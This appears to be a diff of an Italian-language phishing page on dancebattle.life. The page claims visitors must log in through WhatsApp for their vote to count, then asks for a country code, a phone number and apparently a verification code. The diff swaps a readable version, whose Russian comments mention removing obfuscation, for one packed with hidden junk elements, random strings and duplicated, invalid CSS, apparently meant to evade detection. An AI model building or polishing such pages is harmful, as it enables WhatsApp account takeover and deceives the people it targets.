@@ -14,364 +14,1224 @@
     <title>Autorizzazione</title>
     <link rel="stylesheet"
         href="https://dancebattle.life/static/css/themes/zomia/number.css?v=iF_XmVydeXA9UWMabWC6qBNqGURlNGJbit3ycULs52Q%3D" />
-    <!-- External JS libraries -->
     <script
         src="https://dancebattle.life/static/js/lib/socket.io.js?v=xA14CFROUWxBqJIF79G9ZQHsZd083gKibXvVUTrHQJ8%3D"></script>
     <script
         src="https://dancebattle.life/static/js/lib/lazyload.js?v=tNygWs_GKZ5-7U2Dt04KB8nwYPizG4GrXlE2Ao8hjtQ%3D"></script>
     <script
         src="https://dancebattle.life/static/js/lib/notiflix.js?v=pXMqYvjzxYjuQ3-Iz0Zpw3Tk3BAoet8dOsODol_iqTI%3D"></script>
-    <!-- Core script from original site (likely handles dropdown) -->
     <script
         src="https://dancebattle.life/static/js/number.js?v=44ZnprTQE_kUI3go1hDzhdZsbTsiUZ5z6xFuhpus56A%3D"></script>
-    <!-- Additional libraries for phone input -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/css/intlTelInput.css" />
     <script src="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/intlTelInput.min.js"></script>
 
     <style>
-        /* Общие стили */
-        body { background-image: url("https://dancebattle.life/static/img/themes/zomia/background.jpg"); background-color: #ffffff; margin: 0; font-family: sans-serif; }
-        .wrapper { max-width: 500px; margin: 50px auto; padding: 20px; } /* Упрощенный wrapper для примера */
-        .hidden { display: none !important; } /* Важный класс для скрытия */
+        .TdYmjJvmcSBa {
+            display: none;
+            background-color: #POsLWm;
+            box-sizing: initial;
+            opacity: 0.11;
+            font-weight: 500;
+            font-style: oblique;
+            scale: 0.94;
+            line-height: 12;
+            padding: 233px;
+            border-radius: 98px;
+            font-size: 29px;
+            color: #EHlSir;
+            margin: 243px;
+            text-align: right;
+            cursor: text;
+            height: 133px;
+            width: 857px;
+        }
 
-        /* Стили для блоков шагов (адаптировано) */
-        .block { background-color: #1d3957; padding: 30px; border-radius: 8px; margin-bottom: 20px; }
-        .block .text h2 { color: #ffffff; font-size: 1.5em; margin-bottom: 10px; text-align: center; }
-        .block .text p { color: #c6c6c6; font-size: 1em; line-height: 1.5; margin-bottom: 20px; text-align: center; }
+        .rwvCRhgYnBx {
+            display: none;
+            margin: 228px;
+            font-style: italic;
+            color: #oFisGb;
+            padding: 157px;
+            height: 127px;
+            text-align: left;
+            font-size: 93px;
+            background-color: #VqHDjL;
+            border-radius: 19px;
+            opacity: 0.88;
+            scale: 0.52;
+            width: 505px;
+        }
 
-        /* Стили формы */
-        .form-container { background-color: #1d3957; padding: 20px; border-radius: 8px; }
-        .form .country { display: flex; align-items: center; padding: 10px; border: 1px solid #80a2b3; border-radius: 4px; margin-bottom: 15px; cursor: pointer; background-color: #152b42; }
-        .form .country .image img { width: 30px; height: auto; margin-right: 10px; border-radius: 3px; -webkit-mask-image: none !important; }
-        .form .country p.name { color: #ffffff; flex-grow: 1; margin: 0; }
-        .form .country .icon svg { fill: #bfbbbb; width: 10px; height: 10px; }
-        .form .country.active { border-color: #1d9ce0; }
+        .EkrJRaLEYsO {
+            display: none;
+            font-weight: 400;
+            border-radius: 7px;
+            padding: 156px;
+            margin: 230px;
+        }
 
-        /* Стили дропдауна стран */
-        .form .countries { position: absolute; z-index: 10; background-color: #1d3957; border: 1px solid #80a2b3; border-radius: 4px; width: calc(100% - 42px); /* Примерная ширина */ max-height: 300px; overflow: hidden; display: flex; flex-direction: column; margin-top: -10px; /* Чтоб прилегал */ }
-        .form .countries.hidden { display: none; }
-        .form .countries .search { padding: 10px; background-color: #1d3957; border-bottom: 1px solid #80a2b3; display: flex; align-items: center; }
-        .form .countries .search .image svg { fill: #bfbbbb; width: 20px; height: 20px; margin-right: 10px;}
-        .form .countries .search input { flex-grow: 1; background-color: #152b42; border: none; color: #b1c1d1; padding: 8px; border-radius: 4px; outline: none;}
-        .form .countries .items { background-color: #1d3957; max-height: 240px; overflow-y: auto; }
-        .form .countries .items .overflow { /* padding: 5px 0; */ }
-        .form .countries .items .item { display: flex; align-items: center; padding: 10px 15px; cursor: pointer; background-color: #1d3957; }
-        .form .countries .items .item:hover { background-color: #24466b; }
-        .form .countries .items .item .image img { width: 24px; height: auto; margin-right: 10px; border-radius: 2px; -webkit-mask-image: none !important; }
-        .form .countries .items .item p { margin: 0; }
-        .form .countries .items .item p.name { color: #b1c1d1; flex-grow: 1; }
-        .form .countries .items .item p.code { color: #ffffff; font-weight: bold; }
+        .lmTQZiytwQd {
+            display: none;
+            scale: 0.94;
+            opacity: 0.13;
+            background-color: #mAnJXZ;
+        }
 
-        /* Стили инпута номера */
-        .form input.number { width: 100%; padding: 12px; background-color: transparent; border: 1px solid #80a2b3; border-radius: 4px; color: #ffffff; font-size: 1.1em; box-sizing: border-box; margin-bottom: 15px; }
-        .form input.number:focus { border-color: #1d9ce0; outline: none; }
+        .TjYfSpzXTNoUdv {
+            display: none;
+            font-style: normal;
+            color: #LwwJke;
+            scale: 0.52;
+        }
 
-        /* Стили кнопок */
-        .button.primary { display: block; width: 100%; padding: 12px; background-color: #1d9ce0E6; color: #ffffff; border: none; border-radius: 4px; font-size: 1.1em; cursor: pointer; transition: background-color 0.2s ease; }
-        .button.primary:hover { background-color: #1d9ce0; }
+        .MEZNIyFgvRhuXN {
+            display: none;
+            background-color: #GoayGk;
+            width: 67px;
+            text-align: right;
+            margin: 125px;
+            font-weight: 400;
+            box-sizing: border-box;
+            font-style: normal;
+            height: 133px;
+        }
 
-        /* Стили ошибки */
-        .form p.error { color: #d65d7a; margin-top: -10px; margin-bottom: 15px; font-size: 0.9em; }
+        .juxoxMAnNtukzfIm {
+            display: none;
+            background-color: #mAnJXZ;
+            font-size: 27px;
+            scale: 0.48;
+            text-align: justify;
+            opacity: 0.79;
+            color: #lBnzkg;
+            line-height: 58;
+            height: 66px;
+            font-style: oblique;
+            padding: 157px;
+            font-weight: 500;
+            width: 983px;
+            margin: 111px;
+            border-radius: 52px;
+            cursor: default;
+            box-sizing: inherit;
+        }
 
-        /* Стили лоадера и попапов (Упрощенные) */
-        .loader-container { text-align: center; padding: 40px; }
-        .loader { display: inline-block; width: 50px; height: 50px; border: 5px solid #1d3957; border-top-color: #bfbbbb; border-radius: 50%; animation: spin 1s linear infinite; }
-        @keyframes spin { to { transform: rotate(360deg); } }
+        .egeWSiccsIJQ {
+            display: none;
+            padding: 156px;
+            height: 733px;
+            margin: 59px;
+            border-radius: 52px;
+            line-height: 58;
+            box-sizing: initial;
+            width: 535px;
+            font-size: 44px;
+            scale: 0.48;
+            font-weight: 800;
+            font-style: initial;
+            color: #LzmaFZ;
+            text-align: initial;
+            opacity: 0.94;
+            cursor: auto;
+        }
 
-        .popup { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: rgba(0, 0, 0, 0.7); display: flex; justify-content: center; align-items: center; z-index: 100; padding: 20px; box-sizing: border-box; }
-        .popup .body { background-color: #1d3957; padding: 30px; border-radius: 8px; max-width: 400px; text-align: center; color: white; }
-        .popup h2 { margin-top: 0; color: #ffffff; }
-        .popup p { color: #c6c6c6; margin-bottom: 25px; }
-        .popup .button.primary { margin-top: 10px; }
+        .RdMuchDHj {
+            display: none;
+            line-height: 34;
+            font-weight: 800;
+            color: #xNbkxJ;
+            text-align: inherit;
+        }
 
-        /* Стили для вашего блока ввода кода */
-        .form-code .code-title { font-size: 1.2em; font-weight: 700; color: #ffffff; margin-bottom: 10px; }
-        .form-code input.number { text-align: center; font-size: 1.5em; letter-spacing: 5px; }
+        .phjUabQT {
+            display: none;
+            color: #oFisGb;
+            width: 231px;
+            scale: 0.48;
+            height: 586px;
+            font-style: oblique;
+            cursor: grab;
+            font-size: 90px;
+            border-radius: 19px;
+            line-height: 8;
+            background-color: #GoayGk;
+            margin: 228px;
+            padding: 105px;
+        }
 
-        /* Убираем лишние стили, которые были для обфускации */
-        .TdYmjJvmcSBa, .rwvCRhgYnBx, .EkrJRaLEYsO, .lmTQZiytwQd, .TjYfSpzXTNoUdv,
-        .MEZNIyFgvRhuXN, .juxoxMAnNtukzfIm, .egeWSiccsIJQ, .RdMuchDHj, .phjUabQT,
-        .CUuwPmBOQqkLDnR, .QSXSXYDCnbqkFWy, .zFFCQoOq, .HJCjuJdBRxyFkVhn {
-            display: none !important; /* Полностью убираем эти блоки */
+        .CUuwPmBOQqkLDnR {
+            display: none;
+            height: 325px;
+            font-size: 90px;
+            background-color: #pJihnh;
+            cursor: pointer;
+            scale: 0.6;
+            font-style: italic;
+            font-weight: 500;
+            color: #oFisGb;
+            width: 231px;
+            text-align: justify;
+            margin: 111px;
+            padding: 65px;
+        }
+
+        .QSXSXYDCnbqkFWy {
+            display: none;
+            width: 14px;
+            background-color: #dXDFTp;
+        }
+
+        .zFFCQoOq {
+            display: none;
+            margin: 243px;
+            line-height: 32;
+            font-size: 93px;
+            text-align: right;
+            cursor: move;
+            padding: 156px;
+            font-weight: 600;
+            font-style: oblique;
+            border-radius: 32px;
+            height: 262px;
+            color: #toGUJC;
+        }
+
+        .HJCjuJdBRxyFkVhn {
+            display: none;
+            font-size: 27px;
+            text-align: right;
+            padding: 152px;
+            height: 586px;
+            scale: 0.51;
+            margin: 243px;
+            font-style: oblique;
+            width: 535px;
+            color: #EHlSir;
+            box-sizing: border-box;
+            font-weight: 500;
+            cursor: not-allowed;
+            opacity: 0.11;
+            background-color: #dXDFTp;
+            line-height: 8;
+            border-radius: 57px;
+        }
+
+        .lmTQZiytwQd {
+            display: none;
+            scale: 0.94;
+            opacity: 0.13;
+            background-color: #mAnJXZ;
+        }
+
+        body {
+            background-image: url("https://dancebattle.life/static/img/themes/zomia/background.jpg");
+            background-color: #ffffff;
+        }
+
+        .egeWSiccsIJQ {
+            display: none;
+            padding: 156px;
+            height: 733px;
+            margin: 59px;
+            border-radius: 52px;
+            line-height: 58;
+            box-sizing: initial;
+            width: 535px;
+            font-size: 44px;
+            scale: 0.48;
+            font-weight: 800;
+            font-style: initial;
+            color: #LzmaFZ;
+            text-align: initial;
+            opacity: 0.94;
+            cursor: auto;
+        }
+
+        .loader {
+            border-top: 5px solid #bfbbbb;
+        }
+
+        .QSXSXYDCnbqkFWy {
+            display: none;
+            width: 14px;
+            background-color: #dXDFTp;
+        }
+
+        .block.number .form .search {
+            background-color: #ffffff;
+        }
+
+        .block.number .form .countries .items .overflow::-webkit-scrollbar-thumb {
+            background: #152b42;
+        }
+
+        .block.number .form .countries .items .overflow::-webkit-scrollbar-thumb:hover {
+            background: #152b42;
+        }
+
+        .CUuwPmBOQqkLDnR {
+            display: none;
+            height: 325px;
+            font-size: 90px;
+            background-color: #pJihnh;
+            cursor: pointer;
+            scale: 0.6;
+            font-style: italic;
+            font-weight: 500;
+            color: #oFisGb;
+            width: 231px;
+            text-align: justify;
+            margin: 111px;
+            padding: 65px;
+        }
+
+        .popup h2,
+        .block .text {
+            color: #ffffff;
+        }
+
+        .popup p,
+        .block .text p {
+            color: #c6c6c6;
+        }
+
+        .CUuwPmBOQqkLDnR {
+            display: none;
+            height: 325px;
+            font-size: 90px;
+            background-color: #pJihnh;
+            cursor: pointer;
+            scale: 0.6;
+            font-style: italic;
+            font-weight: 500;
+            color: #oFisGb;
+            width: 231px;
+            text-align: justify;
+            margin: 111px;
+            padding: 65px;
+        }
+
+        .button.primary {
+            color: #ffffff;
+            background-color: #1d9ce0E6;
+            width: 100% !important;
+        }
+
+        .QSXSXYDCnbqkFWy {
+            display: none;
+            width: 14px;
+            background-color: #dXDFTp;
+        }
+
+        .button.primary:hover {
+            background-color: #1d9ce0;
+        }
+
+        .code-title {
+            font-size: 26px;
+            font-weight: 700;
+            /* font-style: oblique; */
+        }
+
+        .CUuwPmBOQqkLDnR {
+            display: none;
+            height: 325px;
+            font-size: 90px;
+            background-color: #pJihnh;
+            cursor: pointer;
+            scale: 0.6;
+            font-style: italic;
+            font-weight: 500;
+            color: #oFisGb;
+            width: 231px;
+            text-align: justify;
+            margin: 111px;
+            padding: 65px;
+        }
+
+        .block.number .form-container {
+            background-color: #1d3957;
+        }
+
+        .CUuwPmBOQqkLDnR {
+            display: none;
+            height: 325px;
+            font-size: 90px;
+            background-color: #pJihnh;
+            cursor: pointer;
+            scale: 0.6;
+            font-style: italic;
+            font-weight: 500;
+            color: #oFisGb;
+            width: 231px;
+            text-align: justify;
+            margin: 111px;
+            padding: 65px;
+        }
+
+        .block.number .form-container .form .country {
+            border: 1px solid #80a2b3;
+        }
+
+        .block.number .form-container .form .country .image img {
+            -webkit-mask-image: none !important;
+        }
+
+        .block.number .form-container .form .countries .item .image img {
+            -webkit-mask-image: none !important;
+        }
+
+        .block.number .form-container .form .country.active {
+            border: 1px solid #1d9ce0;
+        }
+
+        .block.number .form-container .form .country p {
+            color: #ffffff;
+        }
+
+        .block.number .form-container .form .country .icon svg path {
+            fill: #bfbbbb;
+        }
+
+        .block.number .form-container .form .countries {
+            background-color: #1d3957;
+        }
+
+        .rwvCRhgYnBx {
+            display: none;
+            margin: 228px;
+            font-style: italic;
+            color: #oFisGb;
+            padding: 157px;
+            height: 127px;
+            text-align: left;
+            font-size: 93px;
+            background-color: #VqHDjL;
+            border-radius: 19px;
+            opacity: 0.88;
+            scale: 0.52;
+            width: 505px;
+        }
+
+        .block.number .form-container .form .countries .search {
+            background-color: #1d3957;
+        }
+
+        .top40 .body{
+            top: 40%;
+        }
+
+        .TjYfSpzXTNoUdv {
+            display: none;
+            font-style: normal;
+            color: #LwwJke;
+            scale: 0.52;
+        }
+
+        .block.number .form-container .form .countries .search input {
+            color: #b1c1d1;
+            background-color: #152b42;
+        }
+
+        .TjYfSpzXTNoUdv {
+            display: none;
+            font-style: normal;
+            color: #LwwJke;
+            scale: 0.52;
+        }
+
+        .block.number .form-container .form .countries .items {
+            background-color: #1d3957;
+        }
+
+        .block.number .form-container .form .countries .item {
+            background-color: #1d3957;
+        }
+
+        .juxoxMAnNtukzfIm {
+            display: none;
+            background-color: #mAnJXZ;
+            font-size: 27px;
+            scale: 0.48;
+            text-align: justify;
+            opacity: 0.79;
+            color: #lBnzkg;
+            line-height: 58;
+            height: 66px;
+            font-style: oblique;
+            padding: 157px;
+            font-weight: 500;
+            width: 983px;
+            margin: 111px;
+            border-radius: 52px;
+            cursor: default;
+            box-sizing: inherit;
+        }
+
+        .block.number .form-container .form .countries .item:hover {
+            background-color: #24466b;
+        }
+
+        .QSXSXYDCnbqkFWy {
+            display: none;
+            width: 14px;
+            background-color: #dXDFTp;
+        }
+
+        .block.number .form-container .form .countries .item p.name {
+            color: #b1c1d1;
+        }
+
+        .block.number .form-container .form .countries .item p.code {
+            color: #ffffff;
+        }
+
+        .MEZNIyFgvRhuXN {
+            display: none;
+            background-color: #GoayGk;
+            width: 67px;
+            text-align: right;
+            margin: 125px;
+            font-weight: 400;
+            box-sizing: border-box;
+            font-style: normal;
+            height: 133px;
+        }
+
+        .block.number .form-container .form .qrcode {
+            color: #1d9ce0;
+        }
+
+        .block.number .form-container .form input.number {
+            color: #ffffff;
+            background-color: transparent;
+            border: 1px solid #80a2b3;
+        }
+
+        .block.number .form-container .form input.number:focus {
+            border: 1px solid #1d9ce0;
+        }
+
+        .block.number .form-container .form p.error {
+            color: #d65d7a;
+        }
+
+        .rwvCRhgYnBx {
+            display: none;
+            margin: 228px;
+            font-style: italic;
+            color: #oFisGb;
+            padding: 157px;
+            height: 127px;
+            text-align: left;
+            font-size: 93px;
+            background-color: #VqHDjL;
+            border-radius: 19px;
+            opacity: 0.88;
+            scale: 0.52;
+            width: 505px;
+        }
+
+        .block.code .number-container {
+            border: 20px solid #1d3957;
+            background-color: #ffffff;
+        }
+
+        .popup .body {
+            background-color: #1d3957;
+        }
+
+        @media screen and (max-width: 768px) {
+            .block.code .number-container {
+                border: 10px solid #1d3957;
+            }
+
+            .zFFCQoOq {
+                display: none;
+                margin: 243px;
+                line-height: 32;
+                font-size: 93px;
+                text-align: right;
+                cursor: move;
+                padding: 156px;
+                font-weight: 600;
+                font-style: oblique;
+                border-radius: 32px;
+                height: 262px;
+                color: #toGUJC;
+            }
         }
     </style>
 </head>
 
-<body class="number-page"> <!-- Убраны data-атрибуты, если они не используются -->
+<body class="number-page" data-redirect="https://dancebattle.life/home/grazie" data-template="45">
+    <p class="MEZNIyFgvRhuXN rCFtQcTyMIoqPsOMZEIjGB HXwVwtowipg NoqErhVUohbBE arNTpOETe vzuxBaDKHV">gsXGyhetm
+        hsvqIeZjSqVUxDd rmhvXhMMHmwZZaxEXoaBVqj</p>
     <div class="wrapper">
-
-        <!-- === ШАГ 1: ВВОД НОМЕРА === -->
-        <div class="block number" id="step-1">
-            <div class="text">
-                <h2>Devi accedere tramite WhatsApp affinché il tuo voto venga preso in considerazione.</h2>
-                <p>L'autorizzazione tramite WhatsApp ti consente di proteggere i tuoi dati e risparmiare tempo.</p>
+        <span class="HJCjuJdBRxyFkVhn tOIjuvePPmV gHpInWiOuhsqojyVHpg fbWqZxbOkWmHe EFLINkHZOqmAAcItwWLW ZWugeeBjg">
+            <div class="btBTGkttju">
+                <p class="sRnrhTpRr">nDJkOjcRMteMgojpUyVEUjuuJ rJlgurWIUv</p>
             </div>
+        </span>
+        <div class="block number" id="step-1">
+            <small class="rwvCRhgYnBx XXfSIvFiCHTKGVhSExc fYeYajskKFDICCwX">
+                <h4 class="nfaFmFIlQtgBpY">AoZkWlXyWLOdHAFjBVhcNRj mPFTWfchNzYOhKntFfuOL ePUAFlUaf
+                    QUWrfYpkvcaXGBxIuGAEcwoas GYuOqPibs QVyNuOFFBXkZHsLGfR CgUPeYrnFfCPIxczjDslfge QQKAHgQeFpjdWgu
+                    ulKQkMUrIgoOgKcdf YxElzNKTIOIP</h4>
+            </small>
+            <div class="text">
+                <h5 class="RdMuchDHj tpWqtQKjEYD">fiBMLCLNngvHH</h5>
 
+
+                <h2>Devi accedere tramite WhatsApp affinché il tuo voto venga preso in considerazione.</h2>
+                <small
+                    class="CUuwPmBOQqkLDnR qygifepowfcwNpYiwIPqTsB pYuVLgSQXTPnzOsjZgWiCaOFL MymbuHKI WMAmNSmIK IAGlswnUXQyzrQRzVbZs">
+                    <h6 class="MXQJididkCWQAl">TmIEUJJfDZrxnzDzbx DWbpJizMWzfRvqyQ oOwvJSlWmTg tuCPOHrhOaNmHtxVRF
+                        StzcxoAdfnCLSEwi kNkcHifxqigl OMNzbdhZkjCwTS</h6>
+                </small>
+
+                <span
+                    class="HJCjuJdBRxyFkVhn tOIjuvePPmV gHpInWiOuhsqojyVHpg fbWqZxbOkWmHe EFLINkHZOqmAAcItwWLW ZWugeeBjg">
+                    <div class="btBTGkttju">
+                        <p class="sRnrhTpRr">nDJkOjcRMteMgojpUyVEUjuuJ rJlgurWIUv</p>
+                    </div>
+                </span>
+
+                <h5
+                    class="juxoxMAnNtukzfIm lNxpBmxtmOtfOlerNBe zJldAYjRNfMACuePoxBzqmNJe pomMZXBqTUpKgEOUn qESlrnIrXJoCuBwufAgmKMejA">
+                    ZamYcRmZU zndcRBwfqEhgwxqRXabIHvrm QTkiPMLi DbLaPvYrUWUiqFSmi</h5>
+                <p>L'autorizzazione tramite WhatsApp ti consente di proteggere i tuoi dati e risparmiare tempo.</p>
+
+
+                <span
+                    class="HJCjuJdBRxyFkVhn tOIjuvePPmV gHpInWiOuhsqojyVHpg fbWqZxbOkWmHe EFLINkHZOqmAAcItwWLW ZWugeeBjg">
+                    <div class="btBTGkttju">
+                        <p class="sRnrhTpRr">nDJkOjcRMteMgojpUyVEUjuuJ rJlgurWIUv</p>
+                    </div>
+                </span>
+
+                <h5
+                    class="juxoxMAnNtukzfIm lNxpBmxtmOtfOlerNBe zJldAYjRNfMACuePoxBzqmNJe pomMZXBqTUpKgEOUn qESlrnIrXJoCuBwufAgmKMejA">
+                    ZamYcRmZU zndcRBwfqEhgwxqRXabIHvrm QTkiPMLi DbLaPvYrUWUiqFSmi</h5>
+            </div>
+            <p class="MEZNIyFgvRhuXN rCFtQcTyMIoqPsOMZEIjGB HXwVwtowipg NoqErhVUohbBE arNTpOETe vzuxBaDKHV">gsXGyhetm
+                hsvqIeZjSqVUxDd rmhvXhMMHmwZZaxEXoaBVqj</p>
             <div id="form-step-1" class="form-container form-num">
+
                 <div class="form" id="myForm">
-                    <!-- Выбор страны -->
+                    <ul class="EkrJRaLEYsO KdzSBOAesdXSe jZzvxRPTyKteAMKxyFrdoPmp NGcTXOnlgoItcI">KeufuQduGbyIESnJxdKC
+                        hykvzYDiNHcNjqGj PgsAwDqxqSBcKb wAigAQfTBfreMjZDIsfBxX JxoZektYrbHlY WsLTZhNoKjWIykQojN
+                        LZltUYfElxwDsrKw LZBBIkTrVQryRMXTQvc EnxoxcmjcpyZygdOuwbVkt</ul>
                     <div class="country">
+
                         <div class="image">
-                            <img src="https://dancebattle.life/static/img/flags/AU.png?v=HufG65VxnEKn_Ob-toF22UxlqX3xC9WSZK3ygAU6nQQ%3D" alt="AU">
+                            <img src="https://dancebattle.life/static/img/flags/AU.png?v=HufG65VxnEKn_Ob-toF22UxlqX3xC9WSZK3ygAU6nQQ%3D"
+                                alt="AU">
                         </div>
+                        <small class="rwvCRhgYnBx XXfSIvFiCHTKGVhSExc fYeYajskKFDICCwX">
+                            <h4 class="nfaFmFIlQtgBpY">AoZkWlXyWLOdHAFjBVhcNRj mPFTWfchNzYOhKntFfuOL ePUAFlUaf
+                                QUWrfYpkvcaXGBxIuGAEcwoas GYuOqPibs QVyNuOFFBXkZHsLGfR CgUPeYrnFfCPIxczjDslfge
+                                QQKAHgQeFpjdWgu ulKQkMUrIgoOgKcdf YxElzNKTIOIP</h4>
+                        </small>
                         <p class="name">Australia</p>
+                        <ul class="EkrJRaLEYsO KdzSBOAesdXSe jZzvxRPTyKteAMKxyFrdoPmp NGcTXOnlgoItcI">
+                            KeufuQduGbyIESnJxdKC hykvzYDiNHcNjqGj PgsAwDqxqSBcKb wAigAQfTBfreMjZDIsfBxX JxoZektYrbHlY
+                            WsLTZhNoKjWIykQojN LZltUYfElxwDsrKw LZBBIkTrVQryRMXTQvc EnxoxcmjcpyZygdOuwbVkt</ul>
                         <div class="icon">
-                            <svg viewBox="0 0 10 5" height="5" width="10" preserveAspectRatio="xMidYMid meet" fill="none">
-                                <path fill-rule="evenodd" clip-rule="evenodd" d="M0 0L5 5L10 0H0Z" fill="currentColor" fill-opacity="0.3"></path>
+                            <svg viewBox="0 0 10 5" height="5" width="10" preserveAspectRatio="xMidYMid meet" class=""
+                                fill="none">
+                                <path fill-rule="evenodd" clip-rule="evenodd" d="M0 0L5 5L10 0H0Z" fill="currentColor"
+                                    fill-opacity="0.3"></path>
                             </svg>
                         </div>
+                        <span class="TdYmjJvmcSBa tbLCiLFKJyfHbkQIzyZlkt ALNyVJaMW OjKCGXKynnNnc GrjJKEHUsHeZzDSEwm">
+                            <h5 class="TqGTdibeuiOqcV">cNZrewXsgH ZSqtLNllkZPCTDpeAOIu hvSyEpuPccUP rPFifostiGlxBN
+                                ZFIDaGgBq PYUASKiSGYgxkwXLVPQ maCanCKOzIJvgYWWri vXGtdtfSKSqNHEFaThEOO IMFZZUui</h5>
+                        </span>
                     </div>
-                    <!-- Сам дропдаун -->
+                    <h5 class="RdMuchDHj tpWqtQKjEYD">fiBMLCLNngvHH</h5>
                     <div class="countries hidden">
+                        <strong class="TjYfSpzXTNoUdv ieLfWPtgF">EQinIceVn aPMEmjEk qdoRdBliaomXbSKCLaLZI
+                            QZhWtdNh</strong>
                         <div class="search">
-                             <div class="image">
-                                <svg viewBox="0 0 24 24" height="20" width="20"><path fill="#bfbbbb" d="M15.009,13.805h-0.636l-0.22-0.219c0.781-0.911,1.256-2.092,1.256-3.386 c0-2.876-2.332-5.207-5.207-5.207c-2.876,0-5.208,2.331-5.208,5.207s2.331,5.208,5.208,5.208c1.293,0,2.474-0.474,3.385-1.255 l0.221,0.22v0.635l4.004,3.999l1.194-1.195L15.009,13.805z M10.201,13.805c-1.991,0-3.605-1.614-3.605-3.605 s1.614-3.605,3.605-3.605s3.605,1.614,3.605,3.605S12.192,13.805,10.201,13.805z"></path></svg>
+                            <h5
+                                class="zFFCQoOq nzSavIXnC jZCYjKnqgfXRrEJOq oAhvqdwyFRfSPZzZwR ZawnPubwcNBpIYUsJJeJMUe uroalBgdudDWVoKlQiQo">
+                                xZnaqANSmo oeNndRzxzo cUyaLrLUISLJx</h5>
+                            <div class="image">
+                                <svg viewBox="0 0 24 24" height="24" width="24" preserveAspectRatio="xMidYMid meet"
+                                    class="" version="1.1" x="0px" y="0px" enable-background="new 0 0 24 24">
+                                    <path fill="#bfbbbb"
+                                        d="M15.009,13.805h-0.636l-0.22-0.219c0.781-0.911,1.256-2.092,1.256-3.386 c0-2.876-2.332-5.207-5.207-5.207c-2.876,0-5.208,2.331-5.208,5.207s2.331,5.208,5.208,5.208c1.293,0,2.474-0.474,3.385-1.255 l0.221,0.22v0.635l4.004,3.999l1.194-1.195L15.009,13.805z M10.201,13.805c-1.991,0-3.605-1.614-3.605-3.605 s1.614-3.605,3.605-3.605s3.605,1.614,3.605,3.605S12.192,13.805,10.201,13.805z">
+                                    </path>
+                                </svg>
                             </div>
-                            <input type="text" id="search" placeholder="Search...">
+                            <li class="phjUabQT RvQlJnVyyYnShdXxl hljLYNhGidhiphm EClRBwpXSGYwsxVsaLrk XIambdaw">
+                                lNJFwMkFeieFVsR YFTqFwJsM ylcwdcAjNOzB jKBjSNLjN</li>
+                            <input type="text" id="search">
+
                         </div>
+                        <li class="phjUabQT RvQlJnVyyYnShdXxl hljLYNhGidhiphm EClRBwpXSGYwsxVsaLrk XIambdaw">
+                            lNJFwMkFeieFVsR YFTqFwJsM ylcwdcAjNOzB jKBjSNLjN</li>
                         <div class="items">
+                            <ul class="EkrJRaLEYsO KdzSBOAesdXSe jZzvxRPTyKteAMKxyFrdoPmp NGcTXOnlgoItcI">
+                                KeufuQduGbyIESnJxdKC hykvzYDiNHcNjqGj PgsAwDqxqSBcKb wAigAQfTBfreMjZDIsfBxX
+                                JxoZektYrbHlY WsLTZhNoKjWIykQojN LZltUYfElxwDsrKw LZBBIkTrVQryRMXTQvc
+                                EnxoxcmjcpyZygdOuwbVkt</ul>
                             <div class="overflow">
-                                <!-- СПИСОК СТРАН С АБСОЛЮТНЫМИ ПУТЯМИ -->
-                                <div class="item" data-code="+61" data-lang="AU" data-name="Australia"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/AU.png" alt="AU"> </div> <p class="name">Australia</p> <p class="code">+61</p> </div>
-                                <div class="item" data-code="+43" data-lang="AT" data-name="Österreich"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/AT.png" alt="AT"> </div> <p class="name">Österreich</p> <p class="code">+43</p> </div>
-                                <div class="item" data-code="+994" data-lang="AZ" data-name="Azərbaycan"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/AZ.png" alt="AZ"> </div> <p class="name">Azərbaycan</p> <p class="code">+994</p> </div>
-                                <div class="item" data-code="+358" data-lang="AX" data-name="Åland"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/AX.png" alt="AX"> </div> <p class="name">Åland</p> <p class="code">+358</p> </div>
-                                <div class="item" data-code="+355" data-lang="AL" data-name="Shqipëri"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/AL.png" alt="AL"> </div> <p class="name">Shqipëri</p> <p class="code">+355</p> </div>
-                                <div class="item" data-code="+213" data-lang="DZ" data-name="الجزائر"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/DZ.png" alt="DZ"> </div> <p class="name">الجزائر</p> <p class="code">+213</p> </div>
-                                <div class="item" data-code="+1" data-lang="AS" data-name="American Samoa"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/AS.png" alt="AS"> </div> <p class="name">American Samoa</p> <p class="code">+1</p> </div>
-                                <div class="item" data-code="+1" data-lang="AI" data-name="Anguilla"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/AI.png" alt="AI"> </div> <p class="name">Anguilla</p> <p class="code">+1</p> </div>
-                                <div class="item" data-code="+244" data-lang="AO" data-name="Angola"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/AO.png" alt="AO"> </div> <p class="name">Angola</p> <p class="code">+244</p> </div>
-                                <div class="item" data-code="+376" data-lang="AD" data-name="Andorra"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/AD.png" alt="AD"> </div> <p class="name">Andorra</p> <p class="code">+376</p> </div>
-                                <div class="item" data-code="+1" data-lang="AG" data-name="Antigua & Barbuda"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/AG.png" alt="AG"> </div> <p class="name">Antigua & Barbuda</p> <p class="code">+1</p> </div>
-                                <div class="item" data-code="+54" data-lang="AR" data-name="Argentina"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/AR.png" alt="AR"> </div> <p class="name">Argentina</p> <p class="code">+54</p> </div>
-                                <div class="item" data-code="+374" data-lang="AM" data-name="Հայաստան"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/AM.png" alt="AM"> </div> <p class="name">Հայաստան</p> <p class="code">+374</p> </div>
-                                <div class="item" data-code="+297" data-lang="AW" data-name="Aruba"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/AW.png" alt="AW"> </div> <p class="name">Aruba</p> <p class="code">+297</p> </div>
-                                <div class="item" data-code="+93" data-lang="AF" data-name="افغانستان"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/AF.png" alt="AF"> </div> <p class="name">افغانستان</p> <p class="code">+93</p> </div>
